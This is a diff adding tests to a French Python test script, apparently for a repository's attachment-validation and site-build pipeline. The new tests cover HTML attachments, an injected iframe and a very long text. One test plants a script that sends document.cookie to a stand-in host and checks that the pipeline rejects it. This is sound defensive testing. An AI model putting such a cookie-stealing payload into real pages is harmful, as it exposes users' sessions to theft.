@@ -93,6 +93,70 @@ with tempfile.TemporaryDirectory() as tmp:
         r = py(copie, "outils/valider.py")
         verifier("pièce ajoutée à la main (.docm) : valider.py refuse", r.returncode == 1 and "docm" in (r.stdout + r.stderr), r.stdout + r.stderr)
 
+    print("Robot : page HTML en pièce jointe")
+    HTML = ("<!DOCTYPE html><html lang=\"fr\"><head><meta charset=\"utf-8\"><title>Outil</title></head>"
+            "<body><p>Bonjour</p><script>document.body.dataset.x = '1';</script></body></html>").encode("utf-8")
+    with tempfile.TemporaryDirectory() as t6:
+        copie, r = preparer(t6, [V.pj("outil.html", HTML)])
+        verifier("html : fichier validé produit", r.returncode == 0, r.stdout + r.stderr)
+        r = py(copie, "outils/integrer_validations.py")
+        verifier("html : robot accepte", r.returncode == 0, r.stdout + r.stderr)
+        proj = os.path.join(copie, "projets", "fiche-reflexe-de-synthese")
+        verifier("html : écrit dans pieces-jointes du projet", os.path.exists(os.path.join(proj, "pieces-jointes", "outil.html")))
+        r = py(copie, "outils/valider.py")
+        verifier("html : vérification du dépôt entier réussit", r.returncode == 0, r.stdout + r.stderr)
+        r = py(copie, "outils/build.py")
+        verifier("html : construction du site réussit", r.returncode == 0, r.stdout + r.stderr)
+        pub = os.path.join(copie, "site", "pieces-jointes", "fiche-reflexe-de-synthese")
+        verifier("html : publié uniquement en .zip", sorted(os.listdir(pub)) == ["outil.html.zip"] if os.path.isdir(pub) else False, os.listdir(pub) if os.path.isdir(pub) else "absent")
+        import zipfile
+        verifier("html : le .zip contient la page à l'identique", os.path.isdir(pub) and zipfile.ZipFile(os.path.join(pub, "outil.html.zip")).read("outil.html") == HTML)
+        servis = [os.path.join(d, f) for d, _, fs in os.walk(os.path.join(copie, "site")) for f in fs if f.lower().endswith((".html", ".htm")) and "pieces-jointes" in d]
+        verifier("html : aucune page HTML déposée n'est servie telle quelle", not servis, servis)
+        page = open(os.path.join(copie, "site", "projets", "fiche-reflexe-de-synthese.html"), encoding="utf-8").read()
+        verifier("html : la page du projet explique le .zip", "outil.html.zip" in page and "ne s'ouvrent jamais depuis ce site" in page)
+        verifier("html : l'archive du projet contient la page", "fiche-reflexe-de-synthese/pieces-jointes/outil.html" in zipfile.ZipFile(os.path.join(copie, "site", "telechargements", "fiche-reflexe-de-synthese.zip")).namelist())
+
+    with tempfile.TemporaryDirectory() as t7:
+        copie, r = preparer(t7, [V.pj("outil.html", HTML)])
+        f = os.path.join(copie, "validations", "valide-fiche-reflexe-de-synthese.json")
+        v = json.load(open(f, encoding="utf-8"))
+        piege = HTML.replace(b"</body>", b"<script>fetch('https://x.example/c?d='+document.cookie)</script></body>")
+        v["pieces_jointes"][0]["contenu_b64"] = base64.b64encode(piege).decode()
+        v["pieces_jointes"][0]["sha256"] = hashlib.sha256(piege).hexdigest()
+        json.dump(v, open(f, "w", encoding="utf-8"), ensure_ascii=False)
+        r = py(copie, "outils/integrer_validations.py")
+        verifier("html piégé après validation : refusé", r.returncode == 1 and "fetch" in (r.stdout + r.stderr), r.stdout + r.stderr)
+        verifier("html piégé : aucun projet créé", not os.path.exists(os.path.join(copie, "projets", "fiche-reflexe-de-synthese")))
+
+    with tempfile.TemporaryDirectory() as t8:
+        copie, r = preparer(t8, [V.pj("outil.html", HTML)])
+        py(copie, "outils/integrer_validations.py")
+        d = os.path.join(copie, "projets", "fiche-reflexe-de-synthese", "pieces-jointes")
+        open(os.path.join(d, "outil.html"), "wb").write(HTML.replace(b"</body>", b"<iframe src=\"about:blank\"></iframe></body>"))
+        r = py(copie, "outils/valider.py")
+        verifier("html modifié à la main (iframe) : valider.py refuse", r.returncode == 1 and "iframe" in (r.stdout + r.stderr), r.stdout + r.stderr)
+
+    print("Robot : texte long (500 000 caractères)")
+    with tempfile.TemporaryDirectory() as t9:
+        copie = os.path.join(t9, "depot")
+        shutil.copytree(RACINE, copie, ignore=shutil.ignore_patterns(".git", "site", "__pycache__", "node_modules"))
+        shutil.rmtree(os.path.join(copie, "validations"), ignore_errors=True); os.makedirs(os.path.join(copie, "validations"))
+        d = V.depot([])
+        ligne = "Synthétise les notes fournies en cinq points, sans rien inventer et en citant la source. "
+        d["contenu"] = ("---\nname: synthese\ndescription: synthétise\n---\n" + (ligne + "\n") * 5000)[:500000]
+        brut = os.path.join(t9, "brut.json"); json.dump(d, open(brut, "w", encoding="utf-8"), ensure_ascii=False)
+        vide = os.path.join(t9, "vide.json"); json.dump({}, open(vide, "w"))
+        r = subprocess.run([sys.executable, "-I", os.path.join(copie, "outils-validation", "valider-depot", "scripts", "valider_depot.py"),
+                            "finaliser", brut, vide, "--validateur", "Val", "--sortie", os.path.join(copie, "validations")], capture_output=True, text=True, encoding="utf-8")
+        verifier("500 000 caractères : validation (skill)", r.returncode == 0, r.stdout + r.stderr)
+        r = py(copie, "outils/integrer_validations.py")
+        verifier("500 000 caractères : robot accepte", r.returncode == 0, r.stdout + r.stderr)
+        r = py(copie, "outils/valider.py")
+        verifier("500 000 caractères : vérification du dépôt entier", r.returncode == 0, r.stdout + r.stderr)
+        r = py(copie, "outils/build.py")
+        verifier("500 000 caractères : construction du site", r.returncode == 0, r.stdout + r.stderr)
+
 print()
 if ECHECS:
     print("%d ECHEC(S) : %s" % (len(ECHECS), "; ".join(ECHECS))); sys.exit(1)
